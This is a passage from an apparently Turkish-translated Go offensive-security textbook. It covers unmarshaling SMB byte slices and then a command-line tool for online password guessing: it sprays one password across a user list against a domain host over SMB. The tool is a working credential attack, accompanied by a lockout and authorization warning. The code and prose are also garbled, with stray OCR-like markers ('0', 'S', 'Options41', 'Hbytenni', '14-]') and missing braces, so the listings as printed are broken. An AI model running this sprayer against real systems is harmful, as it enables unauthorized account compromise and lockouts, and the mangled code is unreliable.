```go
            // Variable length data is relative to parent/outer struct.
            // Değişken uzunluklu veri, üst/dış struct'a göredir.
            // Reset reader to point to beginning of data
            // Okuyucuyu (reader) verinin başlangıcına işaret edecek şekilde sıfırla
            r = bytes.NewBuffer(meta.ParentBuf[offset : offset+length])
            // Variable length data fields do NOT advance current offset.
            // Değişken uzunluklu veri alanları mevcut offset'i ilerletmez.
        1
        data := make([]byte, length) 0
        if err := binary.Read(r, binary.LittleEndian, &data)0; err != nil {
            return nil, err

        return data, nil
```

**Liste 6-11: Sabit ve değişken uzunluklu byte slice'larının unmarshaling işlemi (/ch-6/smb/smbiencoderiencoder.go/)**

Öncelikle, slice'ın eleman türünü belirlemek için reflection kullanıyoruz 0. Örneğin, `[]uint8` ile `[]uint32`'nin ele alınışı farklıdır, çünkü eleman başına byte sayısı farklıdır. Bu durumda yalnızca `[]uint8` slice'larını ele alıyoruz. Sonra, okunacak verinin uzunluğunu ve arabellek (buffer) içinde okumaya başlanacak offset'i takip etmek için `length` ve `offset` adlı iki yerel değişken tanımlıyoruz S. Slice `fixed` etiketiyle tanımlanmışsa, bu değeri alıp `length` değişkenine atıyoruz O. `fixed` anahtarı için etiket değerinin slice'ın uzunluğunu tanımlayan bir tamsayı olduğunu hatırlayın. Gelecekteki okumalar için mevcut arabellek offset'ini ilerletmekte bu uzunluğu kullanacağız 0. Sabit uzunluklu alanlarda offset, varsayılan değeri olan sıfırda bırakılır; çünkü bu alanlar her zaman mevcut offset'te yer alacaktır. Değişken uzunluklu slice'lar biraz daha karmaşıktır, çünkü uzunluk e ve offset 0 bilgilerini `Metadata` yapımızdan (structure) alırız. Bir alan (field), verinin aranmasında kendi adını anahtar (key) olarak kullanır. Bu bilgiyi daha önce nasıl doldurduğumuzu hatırlayın. `length` ve `offset` değişkenlerimiz doğru şekilde ayarlandıktan sonra, istenen uzunlukta bir slice oluştururuz 0 ve bunu `binary.Read()` 0 0 çağrısında kullanırız. Yine, bu fonksiyon, hedef slice doldurulana kadar byte okumayı sürdürecek kadar akıllıdır.

Bu, özel etiketler (custom tags), reflection ve az miktarda SMB ile kodlama (encoding) konusunun karanlık köşelerine yaptığımız son derece detaylı bir yolculuk oldu. Artık bu çirkinliği bir kenara bırakıp SMB kütüphanesiyle işe yarar bir şeyler yapalım. Neyse ki, aşağıdaki kullanım senaryoları önemli ölçüde daha az karmaşık olacak.

## SMB ve NTLM ile Etkileşim

### SMB ile Şifre Tahmini

İnceleyeceğimiz ilk SMB kullanım durumu, saldırganlar ve sızma testi uzmanları için oldukça yaygın olan bir durum: SMB üzerinden çevrimiçi şifre tahmini. Yaygın olarak kullanılan kullanıcı adları ve şifreler sağlayarak bir domaine kimlik doğrulamayı (authenticate) deneyeceksiniz. Detaylara girmeden önce, aşağıdaki `get` komutuyla SMB paketini indirmeniz gerekir:

```bash
$ go get github.com/blackhatgo/bhg/ch-6/smb
```

Paket yüklendikten sonra kodlamaya başlayalım. Oluşturacağınız kod (Liste 6-12'de gösterilmiştir) komut satırı argümanları olarak satır sonlarıyla ayrılmış kullanıcı adlarını içeren bir dosya, bir şifre, bir domain ve hedef sunucu bilgisi kabul eder. Belirli domainlerde hesapların kilitlenmesini önlemek için, bir veya daha fazla kullanıcı üzerinde bir şifre listesi denemek yerine, kullanıcı listesi boyunca tek bir şifre deneyeceksiniz.

> **UYARI**  
> Çevrimiçi şifre tahmini, domain üzerindeki hesapların kilitlenmesine yol açarak etkili bir şekilde bir hizmet reddi (denial-of-service) saldırısına neden olabilir. Kodunuzu test ederken dikkatli olun ve bunu yalnızca test etmeye yetkili olduğunuz sistemler üzerinde çalıştırın.

```go
func main() {
    if len(os.Args) != 5 {
        log.Fatalln("Usage: main </user/file> <password> <domain>
        <target_host>")
    }

    buf, err := ioutil.ReadFile(os.Args[1])
    if err != nil {
        log.Fatalln(err)

    options := smb.Options41{
        Password: os.Args[2],
        Domain:   os.Args[3],
        Host:     os.Args[4],
        Port:     445,
    1
    users := bytes.Split(buf, Hbytenni)
    for _, user := range users0 (
    0   options.User = string(user)
        session, err := smb.NewSession(options, false)0
        if err != nil {
            fmt.Printf("[-] Login failed: %s\\%s [%s]\n",
                options.Domain,
                options.User,
                options.Password)
            continue

        defer session.Close()
        if session.IsAuthenticated0
            fmt.Printf(14-] Success       : %s\\%s [%s]\n",
                options.Domain,
                options.User,
                options.Password)
```

**Liste 6-12: Çevrimiçi şifre tahmini için SMB paketinden yararlanma (/ch-6/password-guessing/main.go)**

SMB paketi oturumlar (session) üzerinde çalışır. Bir oturum oluşturmak için önce bir `smb.Options` örneği (instance) başlatırsınız; bu örnek hedef host, kullanıcı, şifre, port ve domain 0 dahil tüm oturum seçeneklerinizi barındırır. Sonra, her bir hedef kullanıcı 0 için döngüye girer, `options.User` değerini uygun şekilde ayarlarsınız 0 ve `smb.NewSession()` 0 çağrısını yaparsınız. Bu fonksiyon sahne arkasında sizin için pek çok ağır işi yapar: hem SMB lehçesini (dialect) hem de kimlik doğrulama mekanizmasını müzakere eder ve ardından uzak hedefe karşı kimlik doğrulama gerçekleştirir. Kimlik doğrulama başarısız olursa fonksiyon bir hata döndürür ve oturum struct'ı üzerindeki `IsAuthenticated` adlı boolean alan, sonuca göre ayarlanır. Ardından bu değeri kontrol ederek kimlik doğrulamanın başarılı olup olmadığını belirler ve başarı durumunda bir başarı mesajı görüntüler 0.

Çevrimiçi bir şifre tahmin aracı oluşturmak için gereken tek şey bu kadar.
